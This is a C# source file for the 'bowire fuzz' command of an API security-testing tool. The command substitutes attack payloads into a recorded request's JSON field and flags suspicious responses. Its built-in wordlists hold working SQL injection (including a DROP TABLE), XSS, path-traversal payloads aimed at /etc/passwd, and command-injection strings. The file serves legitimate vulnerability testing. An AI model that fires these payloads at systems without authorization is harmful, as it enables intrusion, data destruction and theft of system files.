// Copyright 2026 Küstenlogik
// SPDX-License-Identifier: Apache-2.0

using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Kuestenlogik.Bowire.Mocking;
using Kuestenlogik.Bowire.Security;

namespace Kuestenlogik.Bowire.App;

/// <summary>
/// Implementation of <c>bowire fuzz</c> — the Tier-2 schema-aware
/// fuzzing primitive from the security-testing ADR. Takes a request
/// recording (a regular Bowire recording, not necessarily attack-flagged),
/// a JSONPath into its request body, and a payload category. For each
/// payload in the category, substitutes the field's value with the
/// payload, sends the modified request, evaluates per-category response
/// heuristics, and emits a finding when a heuristic fires.
/// </summary>
/// <remarks>
/// <para>
/// v1 scope: HTTP-class requests only (REST / GraphQL / OData /
/// generic HTTP), JSON request body, basic per-category heuristics
/// (SQL: error banners + 500s; XSS: payload reflected unescaped;
/// path traversal: known file markers; command injection: known
/// command-output markers + timing spikes).
/// </para>
/// <para>
/// Schema-awareness — the ADR's killer differentiator — is in place
/// at a basic level: when the targeted field's value is numeric or
/// boolean (visible from the JSON shape), the scanner skips string-
/// payload categories with a clear "field type doesn't match payload
/// class" message. Full frame-semantics-driven skipping (don't fuzz
/// <c>coordinate.latitude</c> with SQLi) lands when the workbench-side
/// UI ships in the next iteration.
/// </para>
/// </remarks>
internal static class FuzzCommand
{
    private static readonly JsonSerializerOptions s_jsonOpts = new()
    {
        PropertyNameCaseInsensitive = true,
        WriteIndented = true,
        DefaultIgnoreCondition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingNull,
    };

    /// <summary>Built-in payload wordlists keyed by category name.</summary>
    private static readonly Dictionary<string, string[]> s_payloads = new(StringComparer.OrdinalIgnoreCase)
    {
        ["sqli"] = new[]
        {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "1 AND SLEEP(5)",
        },
        ["xss"] = new[]
        {
            "<script>alert('bowire-xss')</script>",
            "\"><script>alert('bowire-xss')</script>",
            "<img src=x onerror=alert('bowire-xss')>",
            "javascript:alert('bowire-xss')",
            "'\"--></style></script><svg onload=alert(1)>",
        },
        ["pathtrav"] = new[]
        {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "/etc/passwd%00.png",
        },
        ["cmdinj"] = new[]
        {
            "; cat /etc/passwd",
            "&& whoami",
            "| id",
            "`id`",
            "$(sleep 5)",
        },
    };

    /// <summary>Run the fuzz subcommand. Returns process exit code.</summary>
    public static async Task<int> RunAsync(FuzzOptions options, CancellationToken ct)
    {
        ArgumentNullException.ThrowIfNull(options);

        if (string.IsNullOrWhiteSpace(options.Target))
        {
            await Console.Error.WriteLineAsync("  Usage: bowire fuzz --target <url> --template <recording.json> --field <jsonpath> --payloads <category>").ConfigureAwait(false);
            return 2;
        }
        if (string.IsNullOrWhiteSpace(options.Template) || !File.Exists(options.Template))
        {
            await Console.Error.WriteLineAsync($"  --template file not found: {options.Template}").ConfigureAwait(false);
            return 2;
        }
        if (string.IsNullOrWhiteSpace(options.Field))
        {
            await Console.Error.WriteLineAsync("  --field <jsonpath> required (e.g. --field $.username).").ConfigureAwait(false);
            return 2;
        }
        if (!s_payloads.TryGetValue(options.Category ?? "", out var payloads))
        {
            await Console.Error.WriteLineAsync($"  Unknown payload category '{options.Category}'. Available: {string.Join(", ", s_payloads.Keys)}.").ConfigureAwait(false);
            return 2;
        }

        BowireRecording? recording;
        try
        {
            var raw = await File.ReadAllTextAsync(options.Template, ct).ConfigureAwait(false);
            recording = JsonSerializer.Deserialize<BowireRecording>(raw, s_jsonOpts);
        }
        catch (Exception ex)
        {
            await Console.Error.WriteLineAsync($"  Failed to parse {options.Template}: {ex.Message}").ConfigureAwait(false);
            return 1;
        }
        if (recording is null || recording.Steps.Count == 0)
        {
            await Console.Error.WriteLineAsync("  Recording has no steps to fuzz.").ConfigureAwait(false);
            return 1;
        }

        var probe = recording.Steps[0];
        if (string.IsNullOrEmpty(probe.Body))
        {
            await Console.Error.WriteLineAsync("  Probe step has no body to mutate. Fuzz needs a JSON request body.").ConfigureAwait(false);
            return 1;
        }

        // Parse the body, locate the target field, capture its type
        // for the schema-awareness skip-check.
        JsonElement bodyRoot;
        try
        {
            using var doc = JsonDocument.Parse(probe.Body);
            bodyRoot = doc.RootElement.Clone();
        }
        catch (JsonException ex)
        {
            await Console.Error.WriteLineAsync($"  Probe body is not valid JSON: {ex.Message}").ConfigureAwait(false);
            return 1;
        }

        if (!TryNavigatePath(bodyRoot, options.Field, out var existingValue))
        {
            await Console.Error.WriteLineAsync($"  --field path '{options.Field}' not found in probe body.").ConfigureAwait(false);
            return 1;
        }

        // Schema-aware skip: numeric / boolean fields don't take
        // string injection payloads cleanly. The ADR's full
        // frame-semantics integration (drop SQLi on coordinate.latitude
        // even when the value happens to round-trip as a string) lives
        // in the workbench-side fuzz-UI; this is the basic value-shape
        // check that's available without it.
        if (existingValue.ValueKind is JsonValueKind.Number or JsonValueKind.True or JsonValueKind.False)
        {
            await Console.Error.WriteLineAsync($"  Skipping: --field is {existingValue.ValueKind}; the {options.Category} category sends string payloads. Use --force to override.").ConfigureAwait(false);
            if (!options.Force) return 0;
        }

        Console.WriteLine();
        Console.WriteLine($"  Fuzzing {options.Target}");
        Console.WriteLine($"    template:  {options.Template}");
        Console.WriteLine($"    field:     {options.Field} ({existingValue.ValueKind})");
        Console.WriteLine($"    category:  {options.Category} ({payloads.Length} payload(s))");
        Console.WriteLine();

        using var http = BuildHttpClient(options);
        var findings = new List<FuzzFinding>();
        AttackProbeResponse? baseline = null;

        // Capture a baseline response with the ORIGINAL field value
        // so per-payload diffs / heuristics can compare against
        // "what does this endpoint normally return".
        try
        {
            baseline = await SendProbeAsync(http, options.Target, probe, probe.Body, options.AuthHeaders, ct).ConfigureAwait(false);
            Console.WriteLine($"  baseline: status={baseline.Status} body={baseline.Body.Length}B latency={baseline.LatencyMs}ms");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"  baseline FAILED: {ex.Message}");
        }
        Console.WriteLine();

        for (var i = 0; i < payloads.Length; i++)
        {
            var payload = payloads[i];
            var mutated = ReplaceField(probe.Body, options.Field, payload);
            if (mutated is null)
            {
                Console.WriteLine($"  [{i + 1}/{payloads.Length}] could not substitute payload (path mismatch)");
                continue;
            }
            try
            {
                var resp = await SendProbeAsync(http, options.Target, probe, mutated, options.AuthHeaders, ct).ConfigureAwait(false);
                var marker = EvaluateHeuristic(options.Category!, payload, resp, baseline);
                if (marker is not null)
                {
                    findings.Add(new FuzzFinding(payload, marker, resp));
                    Console.WriteLine($"  [{i + 1}/{payloads.Length}] [VULN] {Snip(payload)} → {marker}");
                }
                else
                {
                    Console.WriteLine($"  [{i + 1}/{payloads.Length}] [ok]  {Snip(payload)} → status={resp.Status} body={resp.Body.Length}B");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [{i + 1}/{payloads.Length}] [err] {Snip(payload)} → {ex.Message}");
            }
        }
        Console.WriteLine();
        if (findings.Count > 0)
        {
            Console.WriteLine($"  {findings.Count} suspicious response(s). Review the matches — fuzz heuristics fire on shape, not confirmation; verify each by hand before reporting.");
        }
        else
        {
            Console.WriteLine($"  No heuristics fired across {payloads.Length} payloads. This is not proof of safety — just that this corpus didn't catch anything.");
        }
        return findings.Count > 0 ? 1 : 0;
    }

    private static bool TryNavigatePath(JsonElement root, string path, out JsonElement value)
    {
        value = root;
        if (string.IsNullOrEmpty(path) || path == "$") return true;
        var trimmed = path.StartsWith("$.", StringComparison.Ordinal) ? path[2..]
                     : path.StartsWith('$') ? path[1..]
                     : path;
        foreach (var segment in trimmed.Split('.', StringSplitOptions.RemoveEmptyEntries))
        {
            if (value.ValueKind != JsonValueKind.Object) return false;
            if (!value.TryGetProperty(segment, out value)) return false;
        }
        return true;
    }

    private static string? ReplaceField(string bodyJson, string fieldPath, string payload)
    {
        try
        {
            using var doc = JsonDocument.Parse(bodyJson);
            // We rewrite via JSON parse → in-memory mutation → re-emit.
            // Top-level object only — nested objects need a richer
            // walker but cover the v1-common case (single-level
            // form-style request body).
            var trimmed = fieldPath.StartsWith("$.", StringComparison.Ordinal) ? fieldPath[2..]
                         : fieldPath.StartsWith('$') ? fieldPath[1..]
                         : fieldPath;
            var segments = trimmed.Split('.', StringSplitOptions.RemoveEmptyEntries);
            if (segments.Length == 0) return null;

            // Materialise the root as a Dictionary tree so we can mutate.
            var root = JsonElementToObject(doc.RootElement);
            if (root is not Dictionary<string, object?> rootMap) return null;

            Dictionary<string, object?> cursor = rootMap;
            for (var i = 0; i < segments.Length - 1; i++)
            {
                if (!cursor.TryGetValue(segments[i], out var next) || next is not Dictionary<string, object?> subMap)
                    return null;
                cursor = subMap;
            }
            cursor[segments[^1]] = payload;

            return JsonSerializer.Serialize(rootMap, s_jsonOpts);
        }
        catch (JsonException) { return null; }
    }

    private static object? JsonElementToObject(JsonElement e) => e.ValueKind switch
    {
        JsonValueKind.Object => e.EnumerateObject().ToDictionary(p => p.Name, p => JsonElementToObject(p.Value)),
        JsonValueKind.Array => e.EnumerateArray().Select(JsonElementToObject).ToList(),
        JsonValueKind.String => e.GetString(),
        JsonValueKind.Number => e.TryGetInt64(out var l) ? l : e.GetDouble(),
        JsonValueKind.True => true,
        JsonValueKind.False => false,
        _ => null,
    };

    /// <summary>
    /// Per-category response heuristics. Returns a human-readable
    /// marker string when the response indicates the payload may have
    /// landed; null when nothing fired.
    /// </summary>
    private static string? EvaluateHeuristic(string category, string payload, AttackProbeResponse resp, AttackProbeResponse? baseline)
    {
        // Cross-category baseline checks first — these fire regardless
        // of which payload family is being thrown.
        if (baseline is not null && resp.LatencyMs - baseline.LatencyMs > 4000)
            return $"latency spiked +{resp.LatencyMs - baseline.LatencyMs}ms vs baseline — suggests blind-execution oracle";

        if (resp.Body.Contains(payload, StringComparison.Ordinal) && category.Equals("xss", StringComparison.OrdinalIgnoreCase))
            return "payload reflected verbatim in response body — XSS-shape match";

        return category.ToUpperInvariant() switch
        {
            "SQLI" => SqlMarker(resp),
            "XSS" => null, // handled above via reflection check
            "PATHTRAV" => PathTravMarker(resp),
            "CMDINJ" => CmdInjMarker(resp),
            _ => null,
        };
    }

    private static string? SqlMarker(AttackProbeResponse resp)
    {
        var b = resp.Body;
        if (resp.Status == 500 && (b.Contains("SQL", StringComparison.OrdinalIgnoreCase)
                                  || b.Contains("ORA-", StringComparison.Ordinal)
                                  || b.Contains("ODBC", StringComparison.Ordinal))) return "HTTP 500 + SQL-flavoured error in body";
        if (b.Contains("syntax error at or near", StringComparison.OrdinalIgnoreCase)) return "PostgreSQL-style syntax-error banner";
        if (b.Contains("Microsoft SQL Server", StringComparison.OrdinalIgnoreCase)) return "MSSQL-error banner";
        if (b.Contains("SQLite", StringComparison.OrdinalIgnoreCase) && b.Contains("error", StringComparison.OrdinalIgnoreCase)) return "SQLite-error banner";
        return null;
    }

    private static string? PathTravMarker(AttackProbeResponse resp)
    {
        var b = resp.Body;
        if (b.Contains("root:x:0:0:", StringComparison.Ordinal)) return "/etc/passwd content returned";
        if (b.Contains("[boot loader]", StringComparison.OrdinalIgnoreCase) && b.Contains("Windows", StringComparison.OrdinalIgnoreCase)) return "Windows boot.ini fragment returned";
        if (b.Contains("[fonts]", StringComparison.OrdinalIgnoreCase)) return "Windows win.ini section returned";
        return null;
    }

    private static string? CmdInjMarker(AttackProbeResponse resp)
    {
        var b = resp.Body;
        if (b.Contains("uid=", StringComparison.Ordinal) && b.Contains("gid=", StringComparison.Ordinal)) return "`id` output detected — command injection landed";
        if (b.Contains("root:x:0:0", StringComparison.Ordinal)) return "`cat /etc/passwd` output detected";
        return null;
    }

    private static async Task<AttackProbeResponse> SendProbeAsync(HttpClient http, string target, BowireRecordingStep probe, string body, IList<string> authHeaders, CancellationToken ct)
    {
        var basePath = probe.HttpPath ?? "/";
        var url = CombineUrl(target, basePath);
        var verb = (probe.HttpVerb ?? "POST").ToUpperInvariant();
        using var req = new HttpRequestMessage(new HttpMethod(verb), url);

        if (probe.Metadata is { Count: > 0 } md)
            foreach (var (k, v) in md) req.Headers.TryAddWithoutValidation(k, v);

        ScanCommand.ApplyAuthHeaders(req, authHeaders);

        if (verb is "POST" or "PUT" or "PATCH" or "DELETE")
            req.Content = new StringContent(body, Encoding.UTF8, "application/json");

        var sw = Stopwatch.StartNew();
        using var resp = await http.SendAsync(req, ct).ConfigureAwait(false);
        var responseBody = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
        sw.Stop();

        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var h in resp.Headers) headers[h.Key] = string.Join(",", h.Value);
        foreach (var h in resp.Content.Headers) headers[h.Key] = string.Join(",", h.Value);

        return new AttackProbeResponse
        {
            Status = (int)resp.StatusCode,
            Headers = headers,
            Body = responseBody,
            LatencyMs = (int)sw.ElapsedMilliseconds,
        };
    }

    private static string CombineUrl(string baseUrl, string path)
    {
        var b = baseUrl.TrimEnd('/');
        var p = string.IsNullOrEmpty(path) ? "/" : (path.StartsWith('/') ? path : "/" + path);
        return b + p;
    }

    [System.Diagnostics.CodeAnalysis.SuppressMessage("Reliability", "CA2000:Dispose objects before losing scope",
        Justification = "HttpClient(handler, disposeHandler: true) takes ownership.")]
    [System.Diagnostics.CodeAnalysis.SuppressMessage("Security", "CA5400:HttpClient may be created without enabling CheckCertificateRevocationList",
        Justification = "CRL toggle handled inside the conditional below.")]
    private static HttpClient BuildHttpClient(FuzzOptions options)
    {
        var handler = new HttpClientHandler { AllowAutoRedirect = false };
        if (options.AllowSelfSignedCerts)
        {
            handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
        }
        else
        {
            handler.CheckCertificateRevocationList = true;
        }
        return new HttpClient(handler, disposeHandler: true)
        {
            Timeout = TimeSpan.FromSeconds(options.TimeoutSeconds),
        };
    }

    private static string Snip(string s) => s.Length <= 32 ? s : s[..30] + "..";

    private sealed record FuzzFinding(string Payload, string Marker, AttackProbeResponse Response);
}

/// <summary>CLI options for <c>bowire fuzz</c>.</summary>
internal sealed class FuzzOptions
{
    public string Target { get; init; } = "";
    public string? Template { get; init; }
    public string? Field { get; init; }
    public string? Category { get; init; }
    public bool Force { get; init; }
    public bool AllowSelfSignedCerts { get; init; }
    public int TimeoutSeconds { get; init; } = 30;
    public IList<string> AuthHeaders { get; init; } = new List<string>();
}
